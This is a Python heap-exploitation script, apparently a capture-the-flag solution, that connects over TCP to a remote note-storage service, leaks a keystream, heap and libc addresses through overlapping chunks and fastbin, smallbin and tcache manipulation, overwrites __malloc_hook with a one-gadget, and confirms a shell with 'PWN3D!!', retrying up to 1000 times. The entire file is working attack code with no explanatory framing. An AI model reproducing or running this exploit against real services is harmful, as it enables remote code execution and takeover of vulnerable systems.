from firstblood.all import uio
import random
import time
import itertools
import numpy as np


def init():
    global r, cnt
    cnt = 0
    # r = uio.spawn('./main', encoding7None)
    # r = uio.local(5454, encoding=None)
    # r = uio.tcp('18.207.3.48', 5454, encoding=None)
    # r = uio.tcp('54.234.79.19', 5454, encoding=None)
    # r = uio.tcp('127.0.0.1', 5454, encoding=None)
    # r = uio.tcp('127.0.0.1', 5459, encoding=None)
    r = uio.tcp('3.231.33.173', 5454, encoding=None)

def create(idx, content):
    global cnt
    cnt += 1
    r.after('idx').after(': ').line(0)
    r.after('idx').after(': ').line(idx)
    r.after('Content').write(content)
    time.sleep(0.01)


def show(idx):
    global cnt
    cnt += 1
    r.after('idx').after(': ').line(1)
    r.after('idx').after(': ').line(idx)
    return r.until('\n.--------')


def delete(idx):
    global cnt
    cnt += 1
    r.after('idx').after(': ').line(2)
    r.after('idx').after(': ').line(idx)


def exploit():
    init()
    L = 0
    A = 1
    O = 1
    W = 2
    P = 1
    C = 3

    print('')
    print(f'[*] Create chunk near counter @ 0x30')
    create(A, 'near'.ljust(0x30-0x10, '\0')) # chunk near ctr
    delete(A)

    print('')
    print(f'[*] Create leak chunk @ 0x20')
    create(L, 'leaker'.ljust(0x20-0x8, 'z'))

    print('')
    print(f'[*] Modify leaker null byte')
    create(O, 'overlapper'.ljust(0x20-0x10, 'z'))

    print('')
    print(f'[*] Get leaker keystream')
    leakks = show(L)[0x18 + 0x20 + 0x8:]
    assert len(leakks) > 0

    print('')
    print(f'[*] Allocate overwriter')
    create(W, 'overwriter')

    print('')
    print(f'[*] Get remaining leaker keystream')
    ksz = show(L)[0x18 + 0x20:][:8]
    assert len(ksz) == 8
    leakks = ksz.xor((0x21).p64) + leakks
    print(f'[+] Leaked {len(leakks)} bytes')

    def leak():
        ctxt = (show(L) + b'\0')[0x18 + 0x20:]
        sz = min(len(leakks), len(ctxt))
        return leakks[:sz].xor(ctxt[:sz])


    print('')
    print(f'[*] Modify overwriter size')
    for i in itertools.count():
        if i & 0xf == 0 and i != 0:
            print('')
        delete(O)
        create(O, 'overlapper'.ljust(0x20-0x8, 'z'))
        wsz = leak()
        if len(wsz) < 8:
            print('?? ', end='', flush=True)
            continue
        wsz = wsz[:8].u64.int
        print(f'{wsz:02x} ', end='', flush=True)
        if 0x60 <= wsz and wsz & 0xf == 1:
            wsz = wsz & 0xf0
            print('')
            break
    delete(O)
    del O
    delete(W)


    print('')
    print(f'[*] Create ptr near to ctr @ 0x30')
    A = 2
    create(A, 'near'.ljust(0x30-0x10, 'z'))
    create(P, 'ptr'.ljust(0x30-0x10, 'z'))
    delete(A)
    delete(P)
    del A

    print('')
    print(f'[*] Leak heap addr')
    heap = leak()[0x20+0x8:]
    assert len(heap) >= 8
    heap = heap[:8].u64.int - 0x280
    print(f'Heap: {heap:x}')

    print('')
    print(f'[*] Forge fd')
    for i in itertools.count():
        if i & 0xf == 0 and i != 0:
            print('')
        create(W, 'overwriter'.ljust(0x20, 'z').ljust(wsz - 0x8, '\0'))
        delete(W)
        fd = leak()[0x20+0x8:]
        if len(fd) < 1:
            print('?? ', end='', flush=True)
            continue
        fd = fd[0]
        print(f'{fd:02x} ', end='', flush=True)
        if fd == 0x60:
            print('')
            break

    print('')
    print(f'[*] Allocate on ctr')
    create(P, 'ptr'.ljust(0x30-0x10, 'z'))
    create(C, ''.ljust(0x30-0x10, '\0'))

    def reset():
        delete(C)
        create(C, ''.ljust(0x20-0x10, '\0'))

    print('')
    print(f'[*] Get writer keystream')
    for c in range(1, 256):
        c = bytes([c])
        reset()
        create(W, b''.ljust(0x28, c).ljust(wsz - 0x8, b'\0'))
        writerks = leak()[0x8:]
        delete(W)
        print(f'[+] Leaked {len(writerks)} bytes')
        if len(writerks) >= 0x28:
            writerks = writerks[:0x28].xor(c*0x28)
            break

    def writeW(sz, fd):
        ptxt = fd.p64.xor(writerks[:0x8])
        reset()
        create(W, ptxt.ljust(sz - 0x10, b'\0'))

    def writeP(sz, fd):
        ptxt = b'overwriter'.ljust(0x18) + (sz.p64 + fd.p64).xor(writerks[0x18:])
        reset()
        create(W, ptxt.ljust(wsz - 0x8, b'\0'))
        delete(W)

    print('')
    print(f'[*] Create fastbin loop on ptr @ 0x30')
    writeP(0x31, heap + 0x310)
    delete(P)
    writeP(0x31, heap + 0x310)

    print('')
    print(f'[*] Create smallbin loop on ptr @ 0x130')
    create(P, 'ptr'.ljust(0x30-0x10, '\0'))
    writeP(0x131, heap + 0x310)
    delete(P)
    writeP(0x31, heap + 0x310)

    print('')
    print(f'[*] Fill space in ptr @ 0x100')
    create(P, 'ptr'.ljust(0x100-0x10, '\0'))
    delete(P)

    print('')
    print(f'[*] Create chunk after ptr @ 0x110')
    create(P, 'ptr'.ljust(0x110-0x10, '\0'))
    delete(P)

    print('')
    print(f'[*] Fill tcache using ptr @ 0x130')
    for i in range(7):
        print(i)
        create(P, 'ptr'.ljust(0x30-0x10, '\0'))
        writeP(0x131, heap + 0x310)
        delete(P)

    print('')
    print(f'[*] Leak libc')
    libc = leak()[0x28:][:0x8]
    print(f'[+] Leak {len(libc)} bytes')
    assert(len(libc) == 0x8)
    libc = libc.u64.int
    print(f'[+] Libc - leak: {libc.hex}')
    # libc 2.27
    libc -= 0x3ebca0
    # libc 2.29
    # libc -= 0x1bcb00
    print(f'[+] Libc - base: {libc.hex}')

    # libc 2.27
    onegadget = libc + 0x4f322
    mallochook = libc + 0x3ebc30
    # libc 2.29
    # onegadget = libc + 0xe7e2b
    # mallochook = libc + 0x1bca90


    print('')
    print(f'[*] Connect ptr to mallochook')
    writeP(0x31, mallochook)
    create(P, 'ptr'.ljust(0x30-0x10, '\0'))

    print('')
    print(f'[*] Write onegadget on mallochook')
    reset()
    writeW(0x31, onegadget)

    print('')
    print(f'[*] Trigger onegadget')
    reset()

    r.line('echo PWN3D!!').after('PWN3D!!').close()



def main():
    success = 0
    cnts = []
    for t in range(1, 1000):
        print('---------- start ----------')
        try:
            exploit()
        except Exception as e:
            print(f'[!] {e}')
            print(f'[!] {repr(e)}')
        else:
            cnts.append(cnt)
            success += 1
        print(f'[.] Success rate: {success * 100 / t}')
        if len(cnts):
            avgcnt7 = np.percentile(cnts, 70)
            avgcnt8 = np.percentile(cnts, 80)
            avgcnt9 = np.percentile(cnts, 90)
            maxcnt = max(cnts)
            print(f'[.] 70 operation count: {avgcnt7:.2f}')
            print(f'[.] 80 operation count: {avgcnt8:.2f}')
            print(f'[.] 90 operation count: {avgcnt9:.2f}')
            print(f'[.] Max operation count: {maxcnt}')
        print('----------  end  ----------')
        print('')
        print('')
main()
